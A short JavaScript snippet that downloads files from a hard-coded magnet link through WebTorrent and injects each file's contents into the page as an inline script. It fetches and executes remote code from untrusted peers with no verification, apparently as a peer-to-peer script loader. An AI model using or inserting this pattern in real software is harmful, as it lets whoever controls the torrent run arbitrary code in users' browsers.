var client = new WebTorrent()

var torrentId = 'magnet:?xt=urn:btih:758ec88c229aad2abdba27569e09856b831113c1&dn=www&tr=udp%3A%2F%2Fexodus.desync.com%3A6969&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.internetwarriors.net%3A1337&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.fastcast.nz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com'

function addScript(sourceCode){
    if (sourceCode != null){ 
        var script   = document.createElement("script");
        script.type  = "text/javascript"; 
        script.innerHTML = sourceCode;
        document.body.appendChild(script);
        return true;
    } else {
        return false;
    };
};

client.add(torrentId, function (torrent) { 
    torrent.on('done', function(){
        torrent.files.forEach(function(file){
            console.log(file);
            file.getBuffer(function (err, buffer) {
                if (err) throw err 
                addScript(buffer.toString()) 
            })
        })
    })
})

client.on('download', function (bytes) {
    console.log('just downloaded: ' + bytes)
    console.log('total downloaded: ' + client.downloaded);
    console.log('download speed: ' + client.downloadSpeed)
    console.log('progress: ' + client.progress)
})